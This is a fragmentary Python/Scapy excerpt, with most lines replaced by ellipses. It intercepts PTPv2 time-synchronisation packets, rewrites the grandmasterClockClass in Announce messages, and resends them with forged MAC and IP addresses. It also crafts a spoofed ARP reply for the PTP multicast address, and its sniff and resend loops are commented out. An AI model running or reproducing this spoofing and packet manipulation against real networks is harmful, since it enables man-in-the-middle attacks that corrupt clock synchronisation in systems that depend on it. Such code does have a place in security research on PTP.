...
def dissect_and_resend_ptpv2(packet):
       ...
       if 'UDP' in packet and 'IP' in packet and Raw in packet:
        ...
        # Manipulation of the Announce_msg: Here we change the grandmasterClockClass!
            ...
            ptp_packet_sending2 = Ether(src='64:31:50:18:80:18', dst="e4:6f:13:39:17:b8") / IP(src='192.168.100.101', dst="224.0.1.129") / \
...
spoofed_packet = ARP(op=2, pdst="224.0.1.129", psrc='192.168.100.101')
...
while (packet_count["0x0"]== 0 and packet_count["0x8"]== 0):
    ...
    # sniff(filter='ip and host 192.168.100.101', prn=dissect_and_resend_ptpv2)
...
# for i in range(10):
#     print(f"Sending.... nr:{i}")
#     dissect_and_resend_ptpv2(pkts)
#     print(f"-------------------------")
